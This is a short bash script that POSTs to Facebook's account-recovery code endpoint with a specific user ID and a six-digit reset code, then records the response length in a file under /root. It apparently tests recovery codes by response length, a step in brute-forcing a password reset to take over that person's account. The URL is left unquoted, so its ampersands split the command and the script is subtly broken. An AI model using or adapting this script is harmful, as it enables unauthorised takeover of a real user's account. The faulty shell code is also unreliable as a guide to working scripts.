command=$(curl -XPOST https://www.facebook.com/recover/code/?u=100015745421328&n=046370&s=23&exp_locale=en_US&redirect_from=button/)
echo ${#command}
var=${#command};
destdir=/root/txt.txt

if [ -f "$destdir" ]
then 
    echo "$var" > "$destdir"
fi

